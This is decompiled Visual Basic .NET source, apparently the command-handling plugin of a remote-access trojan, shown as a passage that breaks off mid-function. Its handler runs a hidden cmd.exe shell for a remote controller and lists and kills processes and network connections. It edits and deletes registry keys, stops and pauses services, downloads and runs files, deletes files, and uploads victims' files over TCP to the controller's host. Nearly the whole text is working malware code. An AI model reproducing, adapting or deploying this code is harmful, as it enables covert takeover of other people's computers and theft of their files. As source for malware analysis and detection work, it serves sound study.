Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.ServiceProcess
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports plg.My

Namespace plg
	' Token: 0x02000007 RID: 7
	Public Class A
		' Token: 0x06000011 RID: 17 RVA: 0x000021D0 File Offset: 0x000003D0
		Public Sub New()
			Me.CN = True
			Me.Y = "|Ghost|"
			Me.F = New Computer()
		End Sub

		' Token: 0x06000012 RID: 18 RVA: 0x000021F8 File Offset: 0x000003F8
		Public Function SB(ByRef S As String) As Byte()
			Return Encoding.[Default].GetBytes(S)
		End Function

		' Token: 0x06000013 RID: 19 RVA: 0x00002214 File Offset: 0x00000414
		Public Function BS(ByRef B As Byte()) As String
			Return Encoding.[Default].GetString(B)
		End Function

		' Token: 0x06000014 RID: 20 RVA: 0x00002230 File Offset: 0x00000430
		Public Function ENB(ByRef s As String) As String
			Dim bytes As Byte() = Encoding.UTF8.GetBytes(s)
			Return Convert.ToBase64String(bytes)
		End Function

		' Token: 0x06000015 RID: 21 RVA: 0x00002254 File Offset: 0x00000454
		Public Function DEB(ByRef s As String) As String
			Dim bytes As Byte() = Convert.FromBase64String(s)
			Return Encoding.UTF8.GetString(bytes)
		End Function

		' Token: 0x06000016 RID: 22 RVA: 0x00002278 File Offset: 0x00000478
		Private Sub RS(a As Object, e As Object)
			Try
				Dim str As String = "rs"
				Dim y As String = Me.Y
				Dim text As String = Conversions.ToString(NewLateBinding.LateGet(e, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing))
				Dim str2 As String = Me.ENB(text)
				NewLateBinding.LateSetComplex(e, Nothing, "Data", New Object() { text }, Nothing, Nothing, True, False)
				Me.Send(str + y + str2)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000017 RID: 23 RVA: 0x000022FC File Offset: 0x000004FC
		Private Sub ex()
			Try
				Me.Send("rsc")
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000018 RID: 24 RVA: 0x00002334 File Offset: 0x00000534
		Public Sub ind(b As Byte())
			Dim array As String() = Strings.Split(Me.BS(b), Me.Y, -1, CompareMethod.Binary)
			Try
				Dim text As String = ""
				Dim left As String = array(1)
				If Operators.CompareString(left, "tcp", False) = 0 Then
					Dim left2 As String = array(2)
					If Operators.CompareString(left2, "~", False) = 0 Then
						text = "tcp" + Me.Y + "~" + Me.Y
						Dim list As List(Of String) = New List(Of String)()
						Dim num As Integer = 3
						Dim num2 As Integer = array.Length - 1
						For i As Integer = num To num2
							list.Add(array(i))
						Next
						For Each mib_TCPROW_OWNER_PID As A.MIB_TCPROW_OWNER_PID In Me.GetAllTcpConnections()
							Dim text2 As String = New IPEndPoint(Long.Parse(Conversions.ToString(mib_TCPROW_OWNER_PID.LA)), 0).Address.ToString() + ":" + Conversions.ToString(CUInt(BitConverter.ToUInt16(New Byte() { mib_TCPROW_OWNER_PID.l2, mib_TCPROW_OWNER_PID.l1 }, 0)))
							Dim text3 As String = New IPEndPoint(Long.Parse(Conversions.ToString(mib_TCPROW_OWNER_PID.RA)), 0).Address.ToString() + ":" + Conversions.ToString(CUInt(BitConverter.ToUInt16(New Byte() { mib_TCPROW_OWNER_PID.R2, mib_TCPROW_OWNER_PID.R1 }, 0)))
							If list.Contains(text2 + text3) Then
								list.Remove(text2 + text3)
							End If
							text = String.Concat(New String() { text, text2, ",", text3, ",", Conversions.ToString(mib_TCPROW_OWNER_PID.state), ",", Process.GetProcessById(mib_TCPROW_OWNER_PID.P).ProcessName, "[", Conversions.ToString(mib_TCPROW_OWNER_PID.P), "]*" })
						Next
						If text.Length > 0 Then
							text = text.Remove(text.Length - 1, 1)
							Me.Send(text)
						End If
						text = "tcp" + Me.Y + "RM"
						If list.Count > 0 Then
							Try
								For Each str As String In list
									text = text + Me.Y + str
								Next
							Finally
								Dim enumerator As List(Of String).Enumerator
								CType(enumerator, IDisposable).Dispose()
							End Try
						End If
						Me.Send(text)
					ElseIf Operators.CompareString(left2, "!", False) = 0 Then
						For Each mib_TCPROW_OWNER_PID2 As A.MIB_TCPROW_OWNER_PID In Me.GetAllTcpConnections()
							Dim str2 As String = New IPEndPoint(Long.Parse(Conversions.ToString(mib_TCPROW_OWNER_PID2.LA)), 0).Address.ToString() + ":" + Conversions.ToString(CUInt(BitConverter.ToUInt16(New Byte() { mib_TCPROW_OWNER_PID2.l2, mib_TCPROW_OWNER_PID2.l1 }, 0)))
							Dim str3 As String = New IPEndPoint(Long.Parse(Conversions.ToString(mib_TCPROW_OWNER_PID2.RA)), 0).Address.ToString() + ":" + Conversions.ToString(CUInt(BitConverter.ToUInt16(New Byte() { mib_TCPROW_OWNER_PID2.R2, mib_TCPROW_OWNER_PID2.R1 }, 0)))
							Dim num3 As Integer = 3
							Dim num4 As Integer = array.Length - 1
							For l As Integer = num3 To num4
								If Operators.CompareString(array(l), str2 + str3, False) = 0 Then
									Try
										mib_TCPROW_OWNER_PID2.state = 12UI
										Dim intPtr As IntPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(mib_TCPROW_OWNER_PID2))
										Marshal.StructureToPtr(mib_TCPROW_OWNER_PID2, intPtr, False)
										A.SetTcpEntry(intPtr)
									Catch ex As Exception
										Me.Send(String.Concat(New String() { "tcp", Me.Y, "ER", Me.Y, ex.Message }))
									End Try
								End If
							Next
						Next
					End If
				ElseIf Operators.CompareString(left, "proc", False) = 0 Then
					Dim left3 As String = array(2)
					If Operators.CompareString(left3, "~", False) = 0 Then
						Me.Send(String.Concat(New String() { "proc", Me.Y, "pid", Me.Y, Conversions.ToString(Process.GetCurrentProcess().Id) }))
					ElseIf Operators.CompareString(left3, "U", False) = 0 Then
						Dim list2 As List(Of Integer) = New List(Of Integer)()
						Dim num5 As Integer = 3
						Dim num6 As Integer = array.Length - 1
						For m As Integer = num5 To num6
							list2.Add(Conversions.ToInteger(array(m)))
						Next
						text = "proc" + Me.Y + "!" + Me.Y
						Dim managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher("SELECT * FROM Win32_Process")
						Try
							For Each managementBaseObject As ManagementBaseObject In managementObjectSearcher.[Get]()
								Dim managementObject As ManagementObject = CType(managementBaseObject, ManagementObject)
								Dim item As Integer = Conversions.ToInteger(managementObject("ProcessId"))
								If list2.Contains(item) Then
									list2.Remove(item)
								Else
									Dim array2 As String() = New String(1) {}
									array2(0) = "System"
									Try
										managementObject.InvokeMethod("getowner", array2)
									Catch ex2 As Exception
									End Try
									text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(managementObject("Name"), "[:]"), managementObject("ProcessId")), "[:]"), managementObject("ExecutablePath")), "[:]"), array2(0)), "[:]"), managementObject("CommandLine")), "[::]")))
								End If
							Next
						Finally
							Dim enumerator2 As ManagementObjectCollection.ManagementObjectEnumerator
							If enumerator2 IsNot Nothing Then
								CType(enumerator2, IDisposable).Dispose()
							End If
						End Try
						Me.Send(text)
						text = "proc" + Me.Y + "RM"
						If list2.Count > 0 Then
							Try
								For Each value As Integer In list2
									text = text + Me.Y + Conversions.ToString(value)
								Next
							Finally
								Dim enumerator3 As List(Of Integer).Enumerator
								CType(enumerator3, IDisposable).Dispose()
							End Try
						End If
						Me.Send(text)
					ElseIf Operators.CompareString(left3, "k", False) = 0 Then
						Dim num7 As Integer = 3
						Dim num8 As Integer = array.Length - 1
						For n As Integer = num7 To num8
							Try
								Process.GetProcessById(Conversions.ToInteger(array(n))).Kill()
							Catch ex3 As Exception
								Me.Send(String.Concat(New String() { "proc", Me.Y, "ER", Me.Y, ex3.Message }))
							End Try
						Next
					ElseIf Operators.CompareString(left3, "kd", False) = 0 Then
						Dim num9 As Integer = 3
						Dim num10 As Integer = array.Length - 1
						For num11 As Integer = num9 To num10
							Try
								Dim array3 As String() = Strings.Split(array(num11), "::", -1, CompareMethod.Binary)
								Dim processById As Process = Process.GetProcessById(Conversions.ToInteger(array3(0)))
								processById.Kill()
								Thread.Sleep(2000)
								File.Delete(array3(1))
								Me.Send(String.Concat(New String() { "proc", Me.Y, "ER", Me.Y, "Deleted ", array3(1) }))
							Catch ex4 As Exception
								Me.Send(String.Concat(New String() { "proc", Me.Y, "ER", Me.Y, ex4.Message }))
							End Try
						Next
					ElseIf Operators.CompareString(left3, "re", False) = 0 Then
						Dim num12 As Integer = 3
						Dim num13 As Integer = array.Length - 1
						For num14 As Integer = num12 To num13
							Try
								Dim array4 As String() = Strings.Split(array(num14), "::", -1, CompareMethod.Binary)
								Dim processById2 As Process = Process.GetProcessById(Conversions.ToInteger(array4(0)))
								processById2.Kill()
								If Not File.Exists(array4(1)) Then
									Dim array5 As String() = array4
									Dim num15 As Integer = 1
									array5(num15) = array4(num15) + ".exe"
								End If
								Process.Start(array4(1), array4(2))
								Me.Send(String.Concat(New String() { "proc", Me.Y, "ER", Me.Y, "Started ", array4(1), " ", array4(2) }))
							Catch ex5 As Exception
								Me.Send(String.Concat(New String() { "proc", Me.Y, "ER", Me.Y, ex5.Message }))
							End Try
						Next
					End If
				ElseIf Operators.CompareString(left, "rs", False) = 0 Then
					Dim left4 As String = array(2)
					If Operators.CompareString(left4, "~", False) = 0 Then
						Try
							Me.Pro.Kill()
						Catch ex6 As Exception
						End Try
						Me.Pro = New Process()
						Me.Pro.StartInfo.RedirectStandardOutput = True
						Me.Pro.StartInfo.RedirectStandardInput = True
						Me.Pro.StartInfo.RedirectStandardError = True
						Me.Pro.StartInfo.FileName = "cmd.exe"
						AddHandler Me.Pro.OutputDataReceived, AddressOf Me.RS
						AddHandler Me.Pro.ErrorDataReceived, AddressOf Me.RS
						AddHandler Me.Pro.Exited, Sub(a0 As Object, a1 As EventArgs)
							Me.ex()
						End Sub
						Me.Pro.StartInfo.UseShellExecute = False
						Me.Pro.StartInfo.CreateNoWindow = True
						Me.Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
						Me.Pro.EnableRaisingEvents = True
						Me.Send("rss")
						Me.Pro.Start()
						Me.Pro.BeginErrorReadLine()
						Me.Pro.BeginOutputReadLine()
					ElseIf Operators.CompareString(left4, "!", False) = 0 Then
						Me.Pro.StandardInput.WriteLine(Me.DEB(array(3)))
					ElseIf Operators.CompareString(left4, "@", False) = 0 Then
						Try
							Me.Pro.Kill()
						Catch ex7 As Exception
						End Try
						Me.Pro = Nothing
					End If
				Else
					If Operators.CompareString(left, "RG", False) = 0 Then
						Try
							Dim left5 As String = array(2)
							If Operators.CompareString(left5, "~", False) = 0 Then
								Dim key As RegistryKey = Me.GetKey(array(3), False)
								text = String.Concat(New String() { "RG", Me.Y, "~", Me.Y, array(3), Me.Y })
								Dim text4 As String = ""
								For Each text5 As String In key.GetSubKeyNames()
									If Not text5.Contains("\") Then
										text4 = text4 + text5 + "[,]"
									End If
								Next
								For Each text6 As String In key.GetValueNames()
									text4 = String.Concat(New String() { text4, text6, "[;]", key.GetValueKind(text6).ToString(), "[;]", key.GetValue(text6, "").ToString(), "[,]" })
								Next
								Me.Send(text + text4)
								Return
							End If
							If Operators.CompareString(left5, "!", False) = 0 Then
								Dim key As RegistryKey = Me.GetKey(array(3), True)
								key.SetValue(array(4), array(5), CType(Conversions.ToInteger(array(6)), RegistryValueKind))
								Return
							End If
							If Operators.CompareString(left5, "@", False) = 0 Then
								Dim key As RegistryKey = Me.GetKey(array(3), True)
								key.DeleteValue(array(4), False)
								Return
							End If
							If Operators.CompareString(left5, "#", False) = 0 Then
								Dim key As RegistryKey = Me.GetKey(array(3), True)
								key.CreateSubKey(array(4))
								Return
							End If
							If Operators.CompareString(left5, "$", False) = 0 Then
								Dim key As RegistryKey = Me.GetKey(array(3), True)
								key.DeleteSubKeyTree(array(4))
							End If
							Return
						Catch ex8 As Exception
							Dim array6 As String() = New String(4) {}
							array6(0) = "RG"
							array6(1) = Me.Y
							array6(2) = "ER"
							array6(3) = Me.Y
							Dim array7 As String() = array6
							Dim num18 As Integer = 4
							Dim text7 As String = ex8.Message
							array7(num18) = Me.ENB(text7)
							Me.Send(String.Concat(array6))
							Return
						End Try
					End If
					If Operators.CompareString(left, "fm", False) = 0 Then
						Dim left6 As String = array(2)
						If Operators.CompareString(left6, "cp", False) = 0 Then
							Dim str4 As String = Me.DEB(array(3))
							Dim array8 As String() = Strings.Split(Me.DEB(array(4)), "*", -1, CompareMethod.Binary)
							For Each text8 As String In array8
								Try
									File.Copy(text8, str4 + Strings.Split(text8, "\", -1, CompareMethod.Binary)(Strings.Split(text8, "\", -1, CompareMethod.Binary).Length - 1), True)
								Catch ex9 As Exception
								End Try
							Next
						ElseIf Operators.CompareString(left6, "mv", False) = 0 Then
							Dim str5 As String = Me.DEB(array(3))
							Dim array10 As String() = Strings.Split(Me.DEB(array(4)), "*", -1, CompareMethod.Binary)
							For Each text9 As String In array10
								Try
									File.Move(text9, str5 + Strings.Split(text9, "\", -1, CompareMethod.Binary)(Strings.Split(text9, "\", -1, CompareMethod.Binary).Length - 1))
								Catch ex10 As Exception
								End Try
							Next
						ElseIf Operators.CompareString(left6, "nd", False) = 0 Then
							Directory.CreateDirectory(Me.DEB(array(3)))
						ElseIf Operators.CompareString(left6, "nf", False) = 0 Then
							File.WriteAllText(Me.DEB(array(3)), "")
						Else
							If Operators.CompareString(left6, "up", False) = 0 Then
								Dim num21 As Integer = 0
								Dim path As String = Me.DEB(array(4))
								Dim text10 As String = array(3)
								Dim num22 As Integer = Conversions.ToInteger(array(5))
								If File.Exists(path) Then
									File.Delete(path)
								End If
								Dim tcpClient As TcpClient = New TcpClient()
								tcpClient.Connect(Me.H, Me.P)
								tcpClient.Client.SendTimeout = -1
								tcpClient.Client.ReceiveBufferSize = 1048576
								Dim fileStream As FileStream = Nothing
								Dim text11 As String = String.Concat(New String() { "get", Me.Y, text10, Me.Y, array(4) })
								Dim text7 As String = text11.Length.ToString() + vbNullChar + text11
								Dim array12 As Byte() = Me.SB(text7)
								tcpClient.Client.Send(array12, 0, array12.Length, SocketFlags.None)
								tcpClient.Client.Poll(-1, SelectMode.SelectRead)
								Try
									File.Delete(path)
									fileStream = New FileStream(path, FileMode.CreateNew)
									While num21 <> num22
										tcpClient.Client.Poll(-1, SelectMode.SelectRead)
										If tcpClient.Client.Available <= 0 Then
											Exit While
										End If
										Dim array13 As Byte() = New Byte(tcpClient.Client.Available - 1 + 1 - 1) {}
										Dim num23 As Integer = tcpClient.Client.Receive(array13, 0, array13.Length, SocketFlags.None)
										fileStream.Write(array13, 0, num23)
										fileStream.Flush()
										num21 += num23
									End While
								Catch ex11 As Exception
								End Try
								Try
									fileStream.Close()
									fileStream.Dispose()
								Catch ex12 As Exception
								End Try
								Try
									tcpClient.Close()
									Return
								Catch ex13 As Exception
									Return
								End Try
							End If
							If Operators.CompareString(left6, "dw", False) = 0 Then
								If File.Exists(Me.DEB(array(3))) Then
									If FileSystem.FileLen(Me.DEB(array(3))) <> 0L Then
										Dim fileStream2 As FileStream = New FileStream(Me.DEB(array(3)), FileMode.Open, FileAccess.Read)
										Try
											Dim tcpClient2 As TcpClient = New TcpClient()
											tcpClient2.Connect(Me.H, Me.P)
											tcpClient2.Client.SendTimeout = -1
											tcpClient2.Client.SendBufferSize = 524288
											Dim num24 As Long = FileSystem.FileLen(Me.DEB(array(3)))
											Dim text12 As String = array(4)
											Try
												Dim text13 As String = String.Concat(New String() { "post", Me.Y, array(3), Me.Y, Conversions.ToString(num24), Me.Y, text12 })
												Dim text7 As String = text13.Length.ToString() + vbNullChar + text13
												Dim array14 As Byte() = Me.SB(text7)
												tcpClient2.Client.Send(array14, 0, array14.Length, SocketFlags.None)
												tcpClient2.Client.Poll(-1, SelectMode.SelectRead)
												Dim array15 As Byte() = New Byte(262144) {}
												tcpClient2.Client.Receive(array15, 0, tcpClient2.Client.Available, SocketFlags.None)
												Dim num25 As Long = 0L
												While num25 <> num24
													Dim num26 As Integer = fileStream2.Read(array15, 0, array15.Length)
													num25 += CLng(num26)
													tcpClient2.Client.Poll(-1, SelectMode.SelectWrite)
													tcpClient2.Client.Send(array15, 0, num26, SocketFlags.None)
												End While
												tcpClient2.Client.Poll(-1, SelectMode.SelectRead)
											Catch ex14 As Exception
											End Try
											tcpClient2.Client.Close(-1)
										Catch ex15 As Exception
										End Try
										fileStream2.Close()
									End If
								End If
							ElseIf Operators.CompareString(left6, "rar", False) = 0 Then
								Dim text14 As String = Interaction.Environ("programfiles") + "\winrar\rar.exe"
								While Not File.Exists(text14)
									If Not text14.Contains("(x86)") Then
										Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "WinRar IsNot Installed" }))
										Return
									End If
									text14 = text14.Replace(" (x86)", "")
								End While
								Dim text15 As String = Me.DEB(array(3))
								Process.Start(New ProcessStartInfo() With { .FileName = text14, .WorkingDirectory = Me.DEB(array(4)), .Arguments = Me.DEB(array(5)), .CreateNoWindow = True, .WindowStyle = ProcessWindowStyle.Hidden }).WaitForExit()
								Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Created ", Me.DEB(array(3)) }))
							ElseIf Operators.CompareString(left6, "unrar", False) = 0 Then
								Dim text16 As String = Interaction.Environ("programfiles") + "\winrar\rar.exe"
								While Not File.Exists(text16)
									If Not text16.Contains("(x86)") Then
										Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "WinRar IsNot Installed" }))
										Return
									End If
									text16 = text16.Replace(" (x86)", "")
								End While
								Dim fileInfo As FileInfo = New FileInfo(Me.DEB(array(3)))
								Process.Start(New ProcessStartInfo() With { .FileName = text16, .WorkingDirectory = fileInfo.Directory.FullName, .Arguments = String.Concat(New String() { "x -y""", fileInfo.Name, """ *.* ""UnRAR_", fileInfo.Name.Remove(fileInfo.Name.Length - fileInfo.Extension.Length - 1, fileInfo.Extension.Length), "\""" }), .CreateNoWindow = True, .WindowStyle = ProcessWindowStyle.Hidden }).WaitForExit()
								Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "UnRAR_", fileInfo.Name.Remove(fileInfo.Name.Length - fileInfo.Extension.Length - 1, fileInfo.Extension.Length) }))
							Else
								If Operators.CompareString(left6, "fl", False) = 0 Then
									Try
										MyProject.Computer.Network.DownloadFile(Me.DEB(array(3)), Me.DEB(array(4)))
										Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Downloaded ", Me.DEB(array(3)), " To ", Me.DEB(array(4)) }))
										Return
									Catch ex16 As Exception
										Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, ex16.Message }))
										Return
									End Try
								End If
								If Operators.CompareString(left6, "~", False) = 0 Then
									SyncLock Me
										text = "FM" + Me.Y + "!"
										For Each driveInfo As DriveInfo In DriveInfo.GetDrives()
											Try
												If driveInfo.IsReady Then
													Dim str6 As String = text
													Dim y As String = Me.Y
													Dim text7 As String = driveInfo.Name + "*" + driveInfo.DriveType.ToString()
													text = str6 + y + Me.ENB(text7)
												End If
											Catch ex17 As Exception
											End Try
										Next
										Try
											Dim str7 As String = text
											Dim y2 As String = Me.Y
											Dim text7 As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\*"
											text = str7 + y2 + Me.ENB(text7)
											Dim str8 As String = text
											Dim y3 As String = Me.Y
											text7 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\*"
											text = str8 + y3 + Me.ENB(text7)
											Dim str9 As String = text
											Dim y4 As String = Me.Y
											text7 = Interaction.Environ("userprofile") + "\*"
											text = str9 + y4 + Me.ENB(text7)
											Dim str10 As String = text
											Dim y5 As String = Me.Y
											text7 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\*"
											text = str10 + y5 + Me.ENB(text7)
											Dim str11 As String = text
											Dim y6 As String = Me.Y
											text7 = Interaction.Environ("programfiles") + "\*"
											text = str11 + y6 + Me.ENB(text7)
											If Interaction.Environ("programdata") IsNot Nothing Then
												Dim str12 As String = text
												Dim y7 As String = Me.Y
												text7 = Interaction.Environ("programdata") + "\*"
												text = str12 + y7 + Me.ENB(text7)
											End If
											Dim str13 As String = text
											Dim y8 As String = Me.Y
											text7 = Interaction.Environ("windir") + "\*"
											text = str13 + y8 + Me.ENB(text7)
											Dim str14 As String = text
											Dim y9 As String = Me.Y
											text7 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\*"
											text = str14 + y9 + Me.ENB(text7)
											Dim str15 As String = text
											Dim y10 As String = Me.Y
											text7 = Interaction.Environ("appdata") + "\*"
											text = str15 + y10 + Me.ENB(text7)
											Dim str16 As String = text
											Dim y11 As String = Me.Y
											text7 = Interaction.Environ("temp") + "\*"
											text = str16 + y11 + Me.ENB(text7)
										Catch ex18 As Exception
										End Try
										Me.Send(text)
										Return
									End SyncLock
								End If
								If Operators.CompareString(left6, "!", False) = 0 Then
									SyncLock Me
										text = String.Concat(New String() { "FM", Me.Y, "@", Me.Y, array(3), Me.Y })
										For Each path2 As String In Directory.GetDirectories(Me.DEB(array(3)))
											Dim str17 As String = text
											Dim text7 As String = New DirectoryInfo(path2).Name
											text = str17 + Me.ENB(text7) + "*"
										Next
										Me.Send(text)
										Return
									End SyncLock
								End If
								If Operators.CompareString(left6, "@", False) = 0 Then
									SyncLock Me
										text = String.Concat(New String() { "FM", Me.Y, "#", Me.Y, array(3), Me.Y })
										Dim num29 As Integer = 0
										For Each text17 As String In Directory.GetFiles(Me.DEB(array(3)))
											Dim fileInfo2 As FileInfo = New FileInfo(text17)
											Dim text18 As String = ""
											If num29 < 60 Then
												Try
													Dim left7 As String = fileInfo2.Extension.ToLower()
													If Operators.CompareString(left7, ".jpg", False) <> 0 Then
														If Operators.CompareString(left7, ".gif", False) <> 0 Then
															If Operators.CompareString(left7, ".png", False) <> 0 Then
																If Operators.CompareString(left7, ".tiff", False) <> 0 Then
																	If Operators.CompareString(left7, ".bmp", False) <> 0 Then
																		If Operators.CompareString(left7, ".jpeg", False) <> 0 Then
																			GoTo IL_1CE9
																		End If
																	End If
																End If
															End If
														End If
													End If
													Dim bitmap As Bitmap = New Bitmap(text17)
													Dim memoryStream As MemoryStream = New MemoryStream()
													bitmap.GetThumbnailImage(24, 24, Nothing, CType(0, IntPtr)).Save(memoryStream, ImageFormat.Jpeg)
													text18 = Convert.ToBase64String(memoryStream.ToArray())
													num29 += 1
													IL_1CE9:
												Catch ex19 As Exception
												End Try
											End If
											If Operators.CompareString(text18, "", False) = 0 Then
												Dim str18 As String = text
												Dim text7 As String = fileInfo2.Name + "*" + Conversions.ToString(fileInfo2.Length)
												text = str18 + Me.ENB(text7) + "*"
											Else
												Dim str19 As String = text
												Dim text7 As String = String.Concat(New String() { fileInfo2.Name, "*", Conversions.ToString(fileInfo2.Length), "*", text18 })
												text = str19 + Me.ENB(text7) + "*"
											End If
										Next
										Me.Send(text)
										Return
									End SyncLock
								End If
								If Operators.CompareString(left6, "#", False) = 0 Then
									text = String.Concat(New String() { "FM", Me.Y, "$", Me.Y, array(3), Me.Y })
									Try
										Dim memoryStream2 As MemoryStream = New MemoryStream()
										Dim callbackData As IntPtr
										Dim thumbnailImage As Image = Image.FromFile(Me.DEB(array(3))).GetThumbnailImage(Conversions.ToInteger(array(4)), Conversions.ToInteger(array(5)), Nothing, callbackData)
										thumbnailImage.Save(memoryStream2, ImageFormat.Jpeg)
										thumbnailImage.Dispose()
										b = memoryStream2.ToArray()
										memoryStream2.Dispose()
										memoryStream2 = New MemoryStream()
										memoryStream2.Write(Me.SB(text), 0, Me.SB(text).Length)
										memoryStream2.Write(b, 0, b.Length)
										Me.Send(memoryStream2.ToArray())
										memoryStream2.Dispose()
										Return
									Catch ex20 As Exception
										Return
									End Try
								End If
								If Operators.CompareString(left6, "rn", False) = 0 Then
									Dim num31 As Integer = 3
									Dim num32 As Integer = array.Length - 1
									For num33 As Integer = num31 To num32
										Try
											Process.Start(Me.DEB(array(num33)))
										Catch ex21 As Exception
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Cant Start >> ", Me.DEB(array(num33)) }))
										End Try
									Next
								ElseIf Operators.CompareString(left6, "dl", False) = 0 Then
									Dim num34 As Integer = 3
									Dim num35 As Integer = array.Length - 1
									For num36 As Integer = num34 To num35
										Dim array16 As String() = Strings.Split(Me.DEB(array(num36)), "*", -1, CompareMethod.Binary)
										Try
											If Operators.CompareString(array16(1), "!", False) = 0 Then
												Directory.Delete(array16(0), True)
											Else
												File.Delete(array16(0))
											End If
											Me.Send(String.Concat(New String() { "FM", Me.Y, "dl", Me.Y, array(num36) }))
										Catch ex22 As Exception
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Cant Delete >> ", array16(0) }))
										End Try
									Next
								ElseIf Operators.CompareString(left6, "rd", False) = 0 Then
									Dim num37 As Integer = 3
									Dim num38 As Integer = array.Length - 1
									For num39 As Integer = num37 To num38
										Try
											If FileSystem.FileLen(Me.DEB(array(num39))) <= 20480L Then
												Dim array6 As String() = New String(6) {}
												array6(0) = "FM"
												array6(1) = Me.Y
												array6(2) = "%"
												array6(3) = Me.Y
												array6(4) = array(num39)
												array6(5) = Me.Y
												Dim array17 As String() = array6
												Dim num40 As Integer = 6
												Dim text7 As String = File.ReadAllText(Me.DEB(array(num39)))
												array17(num40) = Me.ENB(text7)
												text = String.Concat(array6)
												Me.Send(text)
											End If
										Catch ex23 As Exception
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Cant Open >> ", Me.DEB(array(num39)) }))
										End Try
									Next
								Else
									If Operators.CompareString(left6, "wr", False) = 0 Then
										Try
											File.WriteAllText(Me.DEB(array(3)), Me.DEB(array(4)))
											Return
										Catch ex24 As Exception
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Cant Write >> ", Me.DEB(array(3)) }))
											Return
										End Try
									End If
									If Operators.CompareString(left6, "nm", False) = 0 Then
										Dim num41 As Integer = 3
										Dim num42 As Integer = array.Length - 1
										Dim num43 As Integer = num41
										While num43 <= num42
											Dim array18 As String() = Strings.Split(Me.DEB(array(num43)), "*", -1, CompareMethod.Binary)
											If Operators.CompareString(array18(2), "!", False) = 0 Then
												Dim directoryInfo As DirectoryInfo = New DirectoryInfo(array18(0))
												Try
													directoryInfo.MoveTo(directoryInfo.Parent.FullName + "\" + array18(1))
													Me.Send(String.Concat(New String() { "FM", Me.Y, "nm", Me.Y, array(num43) }))
													GoTo IL_24FA
												Catch ex25 As Exception
													Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Cant Rename >>'", directoryInfo.Name, "' To '", array18(1), "'" }))
													GoTo IL_24FA
												End Try
												GoTo IL_23FA
											End If
											GoTo IL_23FA
											IL_24FA:
											num43 += 1
											Continue While
											IL_23FA:
											Dim fileInfo3 As FileInfo = New FileInfo(array18(0))
											Try
												fileInfo3.MoveTo(fileInfo3.Directory.FullName + "\" + array18(1))
												Me.Send(String.Concat(New String() { "FM", Me.Y, "nm", Me.Y, array(num43) }))
											Catch ex26 As Exception
												Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Cant Rename >>'", fileInfo3.Name, "' To '", array18(1), "'" }))
											End Try
											GoTo IL_24FA
										End While
									End If
								End If
							End If
						End If
					ElseIf Operators.CompareString(left, "srv", False) = 0 Then
						Dim left8 As String = array(2)
						If Operators.CompareString(left8, "~", False) = 0 Then
							text = "srv" + Me.Y + "~"
							For Each serviceController As ServiceController In ServiceController.GetServices()
								text = String.Concat(New String() { text, Me.Y, serviceController.ServiceName, "[,]", serviceController.DisplayName, "[,]", serviceController.ServiceType.ToString(), "[,]", serviceController.Status.ToString(), "[,]", serviceController.CanStop.ToString() })
							Next
							Me.Send(text)
						ElseIf Operators.CompareString(left8, "!", False) = 0 Then
							For Each serviceController2 As ServiceController In ServiceController.GetServices()
								Dim num46 As Integer = 3
								Dim num47 As Integer = array.Length - 1
								For num48 As Integer = num46 To num47
									If Operators.CompareString(serviceController2.ServiceName.ToLower(), array(num48).ToLower(), False) = 0 Then
										Try
											serviceController2.[Stop]()
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Stopped ", serviceController2.DisplayName }))
											Exit Try
										Catch ex27 As Exception
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, ex27.Message }))
											Exit Try
										End Try
									End If
								Next
							Next
						ElseIf Operators.CompareString(left8, "@", False) = 0 Then
							For Each serviceController3 As ServiceController In ServiceController.GetServices()
								Dim num50 As Integer = 3
								Dim num51 As Integer = array.Length - 1
								For num52 As Integer = num50 To num51
									If Operators.CompareString(serviceController3.ServiceName.ToLower(), array(num52).ToLower(), False) = 0 Then
										Try
											serviceController3.Pause()
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Paused ", serviceController3.DisplayName }))
											Exit Try
										Catch ex28 As Exception
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, ex28.Message }))
											Exit Try
										End Try
									End If
								Next
							Next
